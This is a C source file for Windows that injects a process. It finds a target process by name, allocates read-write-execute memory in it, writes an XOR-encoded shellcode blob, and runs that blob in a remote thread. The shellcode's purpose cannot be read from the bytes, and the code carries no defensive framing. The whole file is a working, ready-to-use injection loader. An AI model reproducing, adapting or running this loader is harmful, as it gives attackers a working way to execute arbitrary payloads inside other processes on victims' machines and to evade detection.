#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

#define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
#define info(msg, ...) printf("[*] " msg "\n", ##__VA_ARGS__)
#define warn(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)

// Sus >:(
unsigned char sussy[] =
	"\x48\x31\xc9\x48\x81\xe9\xd7\xff\xff\xff\x48\x8d\x05\xef"
	"\xff\xff\xff\x48\xbb\x87\x8e\xa2\x43\xf1\xba\x92\xce\x48"
	"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x7b\xc6\x23"
	"\xa7\x01\x45\x6d\x31\x6f\x5e\xa2\x43\xf1\xfb\xc3\x8f\xd7"
	"\xdc\xf3\x15\xb9\x8b\x40\xab\xcf\x05\xf0\x23\xcf\xf2\x19"
	"\x9c\x9f\xb0\xea\xc8\xa3\x9a\xac\x86\x0c\xfc\xf2\x7d\xb9"
	"\xb5\x25\x84\xcd\xc3\x93\x8a\xb9\x8b\x52\x62\xbb\xef\xde"
	"\x41\xdd\x9a\xd3\x0f\x4e\x83\xe3\x42\x30\x58\x7f\x9c\xc6"
	"\xdf\x9c\x0b\x7a\xe8\xb2\xf0\x0c\xcc\x9e\x0b\xf0\x6a\xac"
	"\x45\x07\x06\xa2\x43\xf1\xf2\x17\x0e\xf3\xe1\xea\x42\x21"
	"\xea\xac\x45\xcf\x96\x9c\x07\x7a\xfa\xb2\x87\x86\x5e\x41"
	"\x1f\xb9\x45\x5b\xf0\xc6\x05\x96\xcb\xb9\xbb\x44\x83\xb6"
	"\x47\xea\x72\x31\x16\xd3\x0f\x4e\x83\xe3\x42\x30\x82\x72"
	"\xbb\x76\xb0\xee\x40\xbd\x9e\x9a\x8b\xbe\x5f\xd7\x95\xa9"
	"\x84\xd6\x45\xc7\xaa\xeb\x42\x21\xdc\xac\x8f\x0c\x82\xea"
	"\x7d\xb5\x31\xd2\xd2\xce\x8f\x72\x7d\xb0\x31\x96\x46\xcf"
	"\x8f\x72\x02\xa9\xfb\xca\x90\xde\xd4\xe3\x1b\xb0\xe3\xd3"
	"\x94\xcf\x0d\x4e\x63\xb0\xe8\x6d\x2e\xdf\xcf\xfb\x19\xcf"
	"\xf2\x19\xdc\x6e\xc7\x5d\xbc\x0e\xe7\xac\x86\x0a\x03\x88"
	"\x42\xf1\xba\xd3\x74\xcb\xf9\x84\x44\x0e\x6f\xdb\x09\x46"
	"\x8e\xa2\x43\xf1\x84\xda\x43\x12\x80\xa3\x43\xf1\x84\xde"
	"\x43\x02\xad\xa3\x43\xf1\xf2\xa3\x07\xc6\x34\xe7\xc0\xa7"
	"\xbd\x6d\x1b\xcf\xbf\x6b\x02\x4b\x4a\x27\x6c\xd1\x71\x77"
	"\x0a\xd1\x8e\xff\xee\xeb\xbd\x91\x37\xd1\xd2\xa6\xb6\xff"
	"\xbe\xd0\x63\xcf\x80\xbb\xce\xcf\xeb\xca\x26\x99\xdf\x92"
	"\xbb\xf4\xeb\xd0\x70\xc3\x94\xf6\xa2\xeb\x8e\xa2\x43\xf1"
	"\xba\x92\xce";

// unsigned char sussy[] = "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41";

int findPID(const char *proc) {
	HANDLE hSnapshot;
	PROCESSENTRY32 pe;
	BOOL hResult;
	DWORD PID = 0;
	
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hSnapshot) 
		return 0;

	// Initialize size: needed for using Process32First
	pe.dwSize = sizeof(PROCESSENTRY32);
	
	hResult = Process32First(hSnapshot, &pe);

	while (hResult) {		
		if (!strcmp(proc, pe.szExeFile)) {
			PID = pe.th32ProcessID;
			break;
		}
		hResult = Process32Next(hSnapshot, &pe);
	}
	
	CloseHandle(hSnapshot);

	return PID;
}

void inject(DWORD PID) {
	DWORD TID = NULL;
	HANDLE hProcess, hThread = NULL;
	LPVOID rBuffer;

	info("Trying to open handle to process %ld.", PID);

	// Open handle to process
	hProcess = OpenProcess(
		PROCESS_ALL_ACCESS,
		FALSE,
		PID
	);
	if (hProcess == NULL) {
		warn("Could not get a handle to process %ld, error: %ld", PID, GetLastError());
		exit(EXIT_FAILURE);
	}
	okay("Got a handle to process %ld\n\\---0x%p", PID, hProcess);

	// Allocate space in the process memory with proper permissions
	rBuffer = VirtualAllocEx(
		hProcess,
		NULL,
		sizeof(sussy),
		(MEM_COMMIT | MEM_RESERVE),
		PAGE_EXECUTE_READWRITE
	);
	okay("Allocated %zu-bytes with rwx permissions.", sizeof(sussy));

	// Inject shellcode to the newly-created buffer
	WriteProcessMemory(
		hProcess,
		rBuffer,
		sussy,
		sizeof(sussy),
		NULL
	);
	okay("Wrote %zu-bytes to process memory.", sizeof(sussy));

	// Create a thread and run the shellcode
	hThread = CreateRemoteThreadEx(
		hProcess,
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)rBuffer,
		NULL,
		0,
		0,
		&TID
	);
	if (hThread == NULL) {
		warn("Could not get handle to thread, error: %ld.", GetLastError());
		CloseHandle(hProcess);
		exit(EXIT_FAILURE);
	}
	okay("Got handle to thread %ld\nTID: 0x%p.", TID, hThread);

	// Wait until thread dies(aka. finished executing)
	WaitForSingleObject(hThread, INFINITE);

	info("Cleaning up...");

	CloseHandle(hProcess);
	CloseHandle(hThread);

	info("Finished...!!");
}

int main(int argc, char **argv) {
	DWORD PID = NULL;

	if (argc != 2) {
		warn("Usage: %s <name of process>", argv[0]);
		exit(EXIT_FAILURE);
	}
	
	// Get PID
	if (!(PID = findPID(argv[1]))) {
		info("Cannot find process with the provided name :P");
		exit(EXIT_FAILURE);
	}

	// Inject ofc
	inject(PID);

	exit(EXIT_SUCCESS);
}